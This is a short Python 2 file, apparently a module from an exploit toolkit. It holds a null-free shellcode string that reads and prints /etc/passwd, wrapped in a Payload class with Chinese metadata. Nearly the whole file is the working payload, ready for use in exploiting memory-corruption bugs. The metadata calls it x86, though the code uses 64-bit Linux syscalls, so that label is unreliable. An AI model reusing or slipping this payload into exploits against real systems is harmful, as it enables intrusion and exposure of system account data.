#! /usr/bin/python
# coding:utf-8
shellcode ="\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02"
shellcode +="\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d"
shellcode +="\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f"
shellcode +="\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01"
shellcode +="\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31"
shellcode +="\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65"
shellcode +="\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41\x90\x90"
class Payload(object):
    def __init__(self):
        self.info = \
'''abstract : 这段shellcode的作用是读出/etc/passwd的内容
architecture : x86
length : 84
NULL byte: no.'''
        self.data = shellcode

if __name__=='__main__':
    p=Payload()
    if hasattr(p,'info') and hasattr(p,'data'):
        print "Correct Payload."
    else:
        print "Error: Payload missing 'info' or 'data'."
    print p.info
